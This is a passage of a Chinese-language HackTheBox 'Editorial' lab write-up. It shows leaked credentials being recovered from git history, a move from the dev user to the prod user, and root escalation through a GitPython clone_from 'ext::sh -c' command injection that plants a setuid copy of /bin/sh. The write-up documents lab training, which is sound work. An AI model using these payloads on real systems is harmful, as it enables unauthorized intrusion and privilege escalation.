+<p>可惜普通用户权限不足以修改该文件内容。</p>
+<p><figure>
+  <img src="image-20241022115654170.png" alt="image-20241022115654170" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="git-历史记录敏感信息收集"><span>Git 历史记录敏感信息收集</span>
+  <a href="#git-%e5%8e%86%e5%8f%b2%e8%ae%b0%e5%bd%95%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>dev 用户路径下存在一个 apps 目录，进入该目录，发现这是一个 <code>git</code> 项目文件夹，<code>.git</code> 目录仍然存在</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dev@editorial:/home$ <span class="nb">cd</span> ~
+</span></span><span class="line"><span class="cl">dev@editorial:~$ ls -liah
+</span></span><span class="line"><span class="cl">total 36K
+</span></span><span class="line"><span class="cl"><span class="m">79764</span> drwxr-x--- <span class="m">4</span> dev  dev  4.0K Oct <span class="m">22</span> 06:52 .
+</span></span><span class="line"><span class="cl"><span class="m">76438</span> drwxr-xr-x <span class="m">4</span> root root 4.0K Jun  <span class="m">5</span> 14:36 ..
+</span></span><span class="line"><span class="cl"><span class="m">79704</span> drwxrwxr-x <span class="m">3</span> dev  dev  4.0K Jun  <span class="m">5</span> 14:36 apps
+</span></span><span class="line"><span class="cl"><span class="m">80303</span> lrwxrwxrwx <span class="m">1</span> root root    <span class="m">9</span> Feb  <span class="m">6</span>  <span class="m">2023</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl"><span class="m">80301</span> -rw-r--r-- <span class="m">1</span> dev  dev   <span class="m">220</span> Jan  <span class="m">6</span>  <span class="m">2022</span> .bash_logout
+</span></span><span class="line"><span class="cl"><span class="m">80256</span> -rw-r--r-- <span class="m">1</span> dev  dev  3.7K Jan  <span class="m">6</span>  <span class="m">2022</span> .bashrc
+</span></span><span class="line"><span class="cl"><span class="m">79703</span> drwx------ <span class="m">2</span> dev  dev  4.0K Jun  <span class="m">5</span> 14:36 .cache
+</span></span><span class="line"><span class="cl">  <span class="m">187</span> -rw------- <span class="m">1</span> dev  dev    <span class="m">20</span> Oct <span class="m">22</span> 06:52 .lesshst
+</span></span><span class="line"><span class="cl"><span class="m">80300</span> -rw-r--r-- <span class="m">1</span> dev  dev   <span class="m">807</span> Jan  <span class="m">6</span>  <span class="m">2022</span> .profile
+</span></span><span class="line"><span class="cl"><span class="m">83829</span> -rw-r----- <span class="m">1</span> root dev    <span class="m">33</span> Oct <span class="m">22</span> 04:06 user.txt</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>说明这个项目之前使用了 Git 进行版本控制。然而，当运行 git status 时，Git 显示了项目中的文件都已被删除。</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dev@editorial:~/apps$ ls -liah
+</span></span><span class="line"><span class="cl">total 12K
+</span></span><span class="line"><span class="cl"><span class="m">79704</span> drwxrwxr-x <span class="m">3</span> dev dev 4.0K Jun  <span class="m">5</span> 14:36 .
+</span></span><span class="line"><span class="cl"><span class="m">79764</span> drwxr-x--- <span class="m">4</span> dev dev 4.0K Oct <span class="m">22</span> 06:52 ..
+</span></span><span class="line"><span class="cl"><span class="m">77696</span> drwxr-xr-x <span class="m">8</span> dev dev 4.0K Oct <span class="m">22</span> 06:49 .git
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dev@editorial:~/apps$ git status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">On branch master                                                                  
+</span></span><span class="line"><span class="cl">Changes not staged <span class="k">for</span> commit:                                                  
+</span></span><span class="line"><span class="cl">  <span class="o">(</span>use <span class="s2">&#34;git add/rm &lt;file&gt;...&#34;</span> to update what will be committed<span class="o">)</span>                   
+</span></span><span class="line"><span class="cl">  <span class="o">(</span>use <span class="s2">&#34;git restore &lt;file&gt;...&#34;</span> to discard changes in working directory<span class="o">)</span>        
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        deleted:    app_api/app.py                                                
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/app.py                                       
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-grid.css                 
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-grid.css.map              
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-grid.min.css                                         
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-grid.min.css.map                                     
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.css                                         
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.css.map                                     
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.min.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.min.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-reboot.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-reboot.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-reboot.min.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-reboot.min.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.min.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.min.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-utilities.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-utilities.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-utilities.min.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-utilities.min.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.min.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.min.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap.min.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap.min.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap.rtl.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap.rtl.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap.rtl.min.css
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/css/bootstrap.rtl.min.css.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/images/login-background.jpg
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/images/pexels-janko-ferlic-590493.jpg
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/images/pexels-min-an-694740.jpg
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.bundle.js
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.bundle.js.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.bundle.min.js
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.bundle.min.js.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.esm.js
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.esm.js.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.esm.min.js
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.esm.min.js.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.js
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.js.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.min.js
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/static/js/bootstrap.min.js.map
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/templates/about.html
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/templates/index.html
+</span></span><span class="line"><span class="cl">        deleted:    app_editorial/templates/upload.html</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>Git 是一个分布式版本控制系统，它允许开发者跟踪代码库的变化，并且可以在不同版本之间切换。<code>.git</code> 目录是一个隐藏文件夹，存储了该项目的所有版本历史记录、分支信息、提交记录等。</p>
+<p><code>.git</code> 目录通常包含的内容有：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">objects/：存储着项目的所有数据对象，每一个文件的所有版本都存储为对象。
+</span></span><span class="line"><span class="cl">refs/：记录了分支和标签。
+</span></span><span class="line"><span class="cl">config：Git 项目的配置文件。
+</span></span><span class="line"><span class="cl">HEAD：指向当前活动的分支。</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>推测开发者可能删除了项目文件，但忘记了删除 <code>.git</code> 目录，导致版本控制信息还留在系统中。这种情况下，仍然可以通过 <code>.git</code> 恢复被删除的文件或获取有用的敏感信息。</p>
+<p>查看之前的提交，寻找敏感信息，有时候开发者可能会在提交历史中留下敏感信息，比如API密钥、数据库密码，甚至是应用程序的凭据。</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dev@editorial:~/apps$ git log --oneline
+</span></span><span class="line"><span class="cl">8ad0f31 <span class="o">(</span>HEAD -&gt; master<span class="o">)</span> fix: bugfix in api port endpoint
+</span></span><span class="line"><span class="cl">dfef9f2 change: remove debug and update api port
+</span></span><span class="line"><span class="cl">b73481b change<span class="o">(</span>api<span class="o">)</span>: downgrading prod to dev
+</span></span><span class="line"><span class="cl">1e84a03 feat: create api to editorial info
+</span></span><span class="line"><span class="cl">3251ec9 feat: create editorial app
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//git log --oneline 以简洁的方式展示Git仓库的提交历史，每个提交信息会包含一个提交的哈希值以及提交时的简要描述</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>发现提交记录中，有这样一句 <code>downgrading prod to dev</code>，这句信息表明开发者将 prod 降级为 dev，这一步操作极有可能遗留一些敏感信息，使用 <code>git diff</code> 查看代码更改的差异，定位具体更改内容</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">dev@editorial:~/apps$ git diff 1e84a03 b73481b
+</span></span><span class="line"><span class="cl">diff --git a/app_api/app.py b/app_api/app.py
+</span></span><span class="line"><span class="cl">index 61b786f..3373b14 100644
+</span></span><span class="line"><span class="cl">--- a/app_api/app.py
+</span></span><span class="line"><span class="cl">+++ b/app_api/app.py
+</span></span><span class="line"><span class="cl">@@ -64,7 +64,7 @@ def index():
+</span></span><span class="line"><span class="cl"> @app.route(api_route + &#39;/authors/message&#39;, methods=[&#39;GET&#39;])
+</span></span><span class="line"><span class="cl"> def api_mail_new_authors():
+</span></span><span class="line"><span class="cl">     return jsonify({
+</span></span><span class="line"><span class="cl">-        &#39;template_mail_message&#39;: &#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, &#34; + api_editorial_name + &#34; Team.&#34;
+</span></span><span class="line"><span class="cl">+        &#39;template_mail_message&#39;: &#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, &#34; + api_editorial_name + &#34; Team.&#34;
+</span></span><span class="line"><span class="cl">     }) # TODO: replace dev credentials when checks pass
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> # -------------------------------</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>在两次更改的差异中找到了密码信息</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">- Username: prod
+</span></span><span class="line"><span class="cl">- Password: 080217_Producti0n_2023!@
+</span></span><span class="line"><span class="cl">+ Username: dev
+</span></span><span class="line"><span class="cl">+ Password: dev080217_devAPI!@</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>使用账号密码切换至 prod 用户，成功</p>
+<p><figure>
+  <img src="image-20241022173023570.png" alt="image-20241022173023570" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="root-权限提升"><span>Root 权限提升</span>
+  <a href="#root-%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>从 <code>Dev</code> 用户切换至 <code>Prod</code> 用户，并用 <code>sudo -l </code> 列出用户具有的 <code>sudo</code> 权限，发现具备使用 root 权限运行 <code>clone_prod_change.py</code> 文件的权限</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">prod@editorial:~$ sudo -l
+</span></span><span class="line"><span class="cl">[sudo] password for prod: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries for prod on editorial:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User prod may run the following commands on editorial:
+</span></span><span class="line"><span class="cl">    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>查看 <code>/opt/internal_apps/clone_changes/clone_prod_change.py</code> 文件，发现代码使用了 <code>gitpython</code> 库调用 <code>git</code></p>
+<p><figure>
+  <img src="image-20241024145910846.png" alt="image-20241024145910846" loading="lazy"></figure>
+</p>
+<p>常规提权方式几乎被锁死，GitPython 库是否存在历史漏洞？当前 <code>GitPython</code> 库版本为 3.1.29，通过网络检索发现这个版本是存在 CVE 漏洞的</p>
+<p><figure>
+  <img src="image-20241024145558285.png" alt="image-20241024145558285" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241024145825520.png" alt="image-20241024145825520" loading="lazy"></figure>
+</p>
+<p>根据官方文档，该漏洞受影响的函数是 <code>git.repo.base.Repo.clone_from</code> ，该函数的第一个参数接收一个 URL ，假如对这个参数不做检验直接传给 <code>clone_from</code> 函数，就会造成命令执行漏洞</p>
+<p>clone_prod_change.py 脚本存在的意义应该就是更自由地在受限环境中执行 Git 操作，它的 clone_from 参数是可控的，符合利用条件。接下来我给 <code>clone_prod_change.py</code> 文件传入 <code>ext::sh -c touch% /tmp/FuXian</code></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py &#34;ext::sh -c touch% /tmp/FuXian&#34;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241024150233332.png" alt="image-20241024150233332" loading="lazy"></figure>
+</p>
+<p>看到虽然报错，但成功创建了 <code>/tmp/FuXian</code> 目录，漏洞测试成功。</p>
+<p><strong>利用该漏洞提权</strong></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Setuid（设置用户 ID 位）：当文件具有 setuid 权限时，无论谁执行该文件，该进程将以文件所有者的权限运行。
+</span></span><span class="line"><span class="cl">Setgid（设置组 ID 位）：当文件具有 setgid 权限时，无论谁执行该文件，该进程将以文件所属组的权限运行。</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>创建一个bash脚本，将 <code>/bin/sh</code> 复制至 <code>/tmp/a</code> ，给 <code>/tmp/a</code> 文件提升至 root 权限，并赋予 SetUID、SetGID</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">#!/bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cp /bin/sh /tmp/a
+</span></span><span class="line"><span class="cl">chown root:root /tmp/a
+</span></span><span class="line"><span class="cl">chmod 6777 /tmp/a</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">echo -e &#39;#!/bin/bash\n\ncp /bin/sh /tmp/a\nchown root:root /tmp/a\nchmod 6777 /tmp/a&#39; &gt; /dev/shm/a.sh</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241024151528414.png" alt="image-20241024151528414" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">chmod +x a.sh
+</span></span><span class="line"><span class="cl">sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py &#34;ext::sh -c touch% /dev/shm/a.sh&#34;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241024151936910.png" alt="image-20241024151936910" loading="lazy"></figure>
+</p>
+<p>执行 <code>/tmp/a</code> ，<code>-p</code> 保留权限，完成 Root 提权</p>
+<p><figure>
+  <img src="image-20241024152551978.png" alt="image-20241024152551978" loading="lazy"></figure>
+</p>
+<p>直接利用</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/hackthebox/" class="post-footer-tag-link" title="Tags - HackTheBox">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>HackTheBox</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/hackthebox-editorial/" data-title="HackTheBox Editorial Writeup" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="HackTheBox"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/hackthebox-editorial/" data-hashtag="HackTheBox"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/hackthebox-editorial/" data-title="HackTheBox Editorial Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/cslab-lab1-7/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">Cyberstrikelab Lab1-7 Writeup</div>
+          </div>
+        </a><a href="/posts/hackthebox-escapetwo/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">HackTheBox EscapeTwo Writeup</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#外网信息探测">外网信息探测</a></li>
+    <li><a href="#ssrf内部端口识别">SSRF内部端口识别</a>
+      <ul>
+        <li><a href="#api端点信息获取">API端点信息获取</a></li>
+      </ul>
+    </li>
+    <li><a href="#dev---prod-用户移动">dev -&gt; prod 用户移动</a>
+      <ul>
+        <li><a href="#内网信息收集">内网信息收集</a></li>
+        <li><a href="#git-历史记录敏感信息收集">Git 历史记录敏感信息收集</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-权限提升">Root 权限提升</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
